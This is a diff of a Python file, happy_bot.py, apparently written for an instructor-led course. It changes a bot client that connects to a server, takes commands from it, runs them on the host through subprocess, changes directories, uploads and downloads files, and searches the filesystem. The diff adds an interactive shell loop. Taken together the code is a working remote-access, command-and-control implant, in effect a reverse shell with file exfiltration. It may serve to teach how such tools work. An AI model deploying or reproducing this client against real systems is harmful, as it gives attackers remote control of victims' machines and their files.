@@ -1,18 +1,19 @@
-# Name: MSgt Robert Hendrickson
-# ID:   instructor05
-# DATE: 7 OCT 2021
+################################
+## Name: Robert Hendrickson
+## ID:   instructor05
+## DATE: 10-07-2021
+## FILE: happy_bot.py
+################################
 """
 This program will create a bot and call to a server for commands
-USAGE: ~$ python3 Hendrickson_Minoin.py
+USAGE: ~$ python3 happy_bot.py
 socket module used for send/receive to server
 subprocess module used to send commands to system
-re module/happy_little_searcher used to find files on system
+re module/happy_little_search used to find files on system
 os module used to walk through filesystem
 getpass module required to get the username of the client connection
 sys module used for exit and sys.platform
 time module used to pause between connection attempts
-TODO: PSUEDOCODE in Hendrickson_Minion.txt
-TODO: Commander function needs to loop properly, deal with back command from server
 """
 import socket
 import subprocess
@@ -78,7 +79,8 @@ def download(socket, delimiter):
             data = handle.read()
     except Exception as e:
         # Set up the message to send to the server
-        data = '[!] ERROR: \nTried to open '+filename+'\nReceived Error: '+str(e)
+        typee = str(type(e)).split()[1].split('>')[0]
+        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
         data = data.encode()
         mysendall(socket, data, delimiter)
     else:
@@ -115,10 +117,10 @@ def search(socket, delimiter):
         # now we we add the starting location to path the script is running from
         sys.path.append(start_loc)
         # Now we import the search
-        import happy_little_searcher
+        import happy_search
     else:
         # If the file is in the dir listing import the file
-        import happy_little_searcher
+        import happy_search
     # First we will receive the filepath from the server
     filepath = myrecvall(socket, delimiter).decode()
     # Now we will send that we received the file path to start the search
@@ -148,10 +150,11 @@ def search(socket, delimiter):
         myrecvall(socket, delimiter).decode()
     # We will save the results of the search function to a variable
     try:
-        results = happy_little_searcher.searcher(filepath, known, name, sys.platform)
+        results = happy_search.searcher(filepath, known, name, sys.platform)
     except Exception as e:
         # If an exception occurs we send the error to the server
-        data = '[!] ERROR: '+str(e)
+        typee = str(type(e)).split()[1].split('>')[0]
+        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
         mysendall(socket, data.encode(), delimiter)
         # We receive the server response
         myrecvall(socket, delimiter).decode()
@@ -191,20 +194,39 @@ def search(socket, delimiter):
             mysendall(socket, data, delimiter)
 
 
+def shell(socket, delimiter):
+    """
+    This will run commands in a loop
+    """
+    command = ''
+    while command != 'back':
+        user = getpass.getuser()
+        user_dir = os.getcwd()
+        data = user+';'+user_dir
+        data = data.encode()
+        # We send the information to the server
+        mysendall(socket, data, delimiter)
+        # We receive a command, then if it matches a key word
+        # complete the appropriate action
+        command = myrecvall(socket, delimiter).decode()
+        if command[:4] == 'back':
+            break
+        else:
+            commandant(socket, delimiter)
+            continue
+
 
 def commandant(socket, delimiter):
-    # If command is received run command using subprocess module
-    # First we tell the server we are ready
+    # Get the username for use later 
     user = getpass.getuser()
-    data = b'[!] Enter client command'
-    mysendall(socket, data, delimiter)  # srvr rx
-    print('client tx 1')
+    data = b'[!] Client received command'
+    mysendall(socket, data, delimiter)  
     # Now we get the command from the server
-    command = myrecvall(socket, delimiter).decode()  #srvr tx
-    print('client rx 2')
+    command = myrecvall(socket, delimiter).decode()
     # If the command is cd we need to use the os.chdir command
     if command[:2] == 'cd':
-            # We need exception handling for a cd command, if there is no directory then send the error
+        command = command.strip()
+        # We need exception handling for a cd command, if there is no directory then send the error
         try:
             # We split the string on a space, and set the value of the second item to our location
             commandloc = command.split(' ')[1]
@@ -217,8 +239,7 @@ def commandant(socket, delimiter):
         except IndexError as ie:
             # We tell the server we are switching to the default directory
             data = b'[!] Changing to default directory'
-            mysendall(socket, data, delimiter)  # srvr rx
-            print('client tx 3 -- cd " "')
+            mysendall(socket, data, delimiter)  
             # We do a conditional based on the platform the script is running in
             if sys.platform.startswith('linux'):
                 # Now we change to the home directory
@@ -226,26 +247,21 @@ def commandant(socket, delimiter):
             elif sys.platform.startswith('win'):
                 os.chdir('C:\\Users\\{}'.format(user))
             # Now we sync the server with the client
-            myrecvall(socket, delimiter).decode()  # srvr tx
-            print('client rx 4 -- cd " "')
+            myrecvall(socket, delimiter).decode()  
             # Now we tell the server that it failed
             data = '\n[!] Changed directory to: {}'.format(os.getcwd())
-            mysendall(socket, data.encode(), delimiter)  # srvr rx
-            print('client tx 5 -- cd " "')
+            mysendall(socket, data.encode(), delimiter)  
         except Exception as e:
             # We tell the server there was an error
             data = '[!] ERROR: ' + str(e)
             data = data.encode()
             # We send the error to the server
             mysendall(socket, data, delimiter)
-            print('client tx 3 -- Error')
             # Now we sync the server with the client
             myrecvall(socket, delimiter).decode()
-            print('client rx 4 -- Error')
             # Now we tell the server that it failed
             data = b'\n[!] Client command failed'
             mysendall(socket, data, delimiter)
-            print('client tx 5 -- Error')
         else:
             # If there is no error
             # We use the change dir command to the specified place
@@ -253,26 +269,23 @@ def commandant(socket, delimiter):
             # We send back that the dir is changed to the new location
             data = '[!] Changed directory to: {}'.format(os.getcwd())
             mysendall(socket, data.encode(), delimiter)
-            print('client tx 3 -- cd')
             # Now we sync the information from the server
             myrecvall(socket, delimiter).decode()
-            print('client rx 4 -- cd')
             # Now we send that the command is complete
             data = b'\n[!] Client command complete'
             mysendall(socket, data, delimiter)
-            print('client tx 5 -- cd')
-            # continue
-    elif command[:4] == 'back':
+    elif command[:4] == 'back': # this isn't processing
+        # If back command is received tell server
         data = b'[!] Received back command'
+        # Send received message
         mysendall(socket, data, delimiter)
-        print('client tx 3 -- back')
+        # Receive server message
         myrecvall(socket, delimiter)
-        print('client rx 4 -- back')
-        data = b'\n[!] Exiting command loop'
+        # Tell server client is exiting command loop
+        data = b'[!] Exiting command loop'
+        # Send exit message
         mysendall(socket, data, delimiter)
-        print('client tx 5 -- back')
-        # break
-    else:
+    else: # future shell functionality---
         # Now input that command in to a variable that is the
         # results from subprocess.Popen function
         proc = subprocess.Popen(command,
@@ -285,21 +298,16 @@ def commandant(socket, delimiter):
         # Check if our output is empty
         if not len(output):
             # If empty tell the server there is no output
-            output = b'[!] No command output at client\n'
+            output = b'[!] No command output at client'
         # combine the bytes objects from the previous steps
         results = output + errors
         # now we send the results to the server
         mysendall(socket, results, delimiter)
-        print('client tx 3 -- shell')
         # now we need to wait for a server next message
         myrecvall(socket, delimiter).decode()
-        print('client rx 4 -- shell')
         # now we send that the command completed
         data = b"[!] Client command complete"
         mysendall(socket, data, delimiter)
-        print('client tx 5 -- shell')
-        # go back to beginning of loop
-        # continue
 
 
 def upload(socket, delimiter):
@@ -416,6 +424,9 @@ def main():
             # If command is received call the function above
             commandant(mysocket, delimiter)
             # Go back toe the beginning of the loop
+            continue
+        elif command[:5] == 'shell':
+            shell(mysocket, delimiter)
             continue
 
 
